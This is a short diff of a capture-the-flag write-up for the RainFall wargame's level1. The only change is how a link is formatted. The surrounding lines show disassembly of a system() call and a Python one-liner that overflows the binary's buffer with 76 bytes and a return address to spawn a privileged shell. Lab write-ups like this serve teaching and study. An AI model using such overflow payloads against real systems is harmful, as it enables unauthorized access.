@@ -56,8 +56,8 @@ level1@RainFall:~$  objdump -d -M intel level1
 8048479:	e8 e2 fe ff ff       	call   8048360 <system@plt>
 ```
 Here we find a run command and ```system()``` call that we can exploit. 
-If we run system("/bin/sh"), it will launch a shell that will run with the same priveleges as the calling program. 
-https://stackoverflow.com/questions/43294227/hijacking-system-bin-sh-to-run-arbitrary-commands
+If we run system("/bin/sh"), [it will launch a shell](https://stackoverflow.com/questions/43294227/hijacking-system-bin-sh-to-run-arbitrary-commands) that will run with the same priveleges as the calling program. 
+
 
 ```
 level1@RainFall:~$ (python -c 'print "a"*76 + "\x44\x84\x04\x08"'; cat) | ./level1
